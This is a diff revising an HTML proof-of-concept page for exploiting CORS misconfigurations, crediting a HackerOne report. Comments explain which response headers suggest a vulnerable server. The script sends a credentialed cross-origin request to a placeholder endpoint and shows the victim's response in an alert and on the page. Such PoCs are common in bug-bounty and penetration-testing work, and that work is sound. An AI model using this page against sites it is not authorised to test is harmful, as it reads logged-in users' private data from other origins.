@@ -1,48 +1,68 @@
 <!DOCTYPE html>
 <html>
-   <head>
-<!-- thanks to https://hackerone.com/reports/470298 -->
+<head>
+<!-- thanks to https://hackerone.com/reports/470298
 
-<!-- 
 
-This will produce an alert window containing the contents of a page 
-if the server has a CORS misconfiguration.
+This will produce an alert window containing the contents
+of a page  if the server has a CORS misconfiguration.
 
 If you see
 
 Access-Control-Allow-Credentials: true
-Access-Control-Allow-Origin: *
 
-or the host allows you to set an arbitrary origin yourself, then it's likely
-vulnerable. 
+and the host allows you to set an arbitrary origin yourself,
+then it's likely vulnerable.
 
-It works well on API endpoints and text pages, not great on complicated pages.
+Older browsers used to honor Access-Control-Allow-Origin: *
+in the response headers, but not so much anymore.
+
+This PoC works well on API endpoints and text pages, not great on complicated pages.
 -->
 
-      <script>
-         function cors() {
-            var xhttp = new XMLHttpRequest();
-                xhttp.onreadystatechange = function() {
-                    if (this.readyState == 4 && this.status == 200) {
-                        document.getElementById("demo").innerHTML = alert(this.responseText);
+<script>
+
+function corsReq() {
+            var xhr_req = new XMLHttpRequest();
+            xhr_req.onreadystatechange = function() {
+
+                  if (this.readyState == 4 && this.status == 200) {
+
+                        //show response in alert window
+                        document.getElementById("theAlert").innerHTML = alert(this.responseText);
+
+                        //don't show 'undefined'
+                        document.getElementById("theAlert").innerHTML = ""
+
+                        //show response on page
+	  		                document.getElementById("theText").textContent = (this.responseText);
             }
          };
 
-         xhttp.open("GET", "PUT THE ENDPOINT HERE", true);
-         xhttp.withCredentials = true;
-         xhttp.send();
-         }
-      </script>
-   </head>
-   <body>
-      <center>
-      <h2>CORS Proof of Concept </h2>
-      <h3>Show full content of page</h3>
-      <h4>Works best on API endpoints and text pages</h4>
+         xhr_req.open("GET", "https://THE-ENDPOINT.TLD/PATH", true);
+         xhr_req.withCredentials = true; //send credentials
+         xhr_req.send();
 
-      <div id="demo">
-         <button type="button" onclick="cors()">Send Request</button>
-      </div>
+}
 
+</script>
+
+</head>
+<body>
+   <center>
+   <h2>CORS Proof of Concept </h2>
+   <h3>Retrieve page content</h3>
+   <h4>Works best on API endpoints and text pages</h4>
+
+   <button type="button" onclick="corsReq()">Send Request</button>
+
+   <br><br>
+
+   <div id="theAlert"> </div>
+   <span id="theText"> </span>
+
+   </center>
    </body>
+
 </html>
+
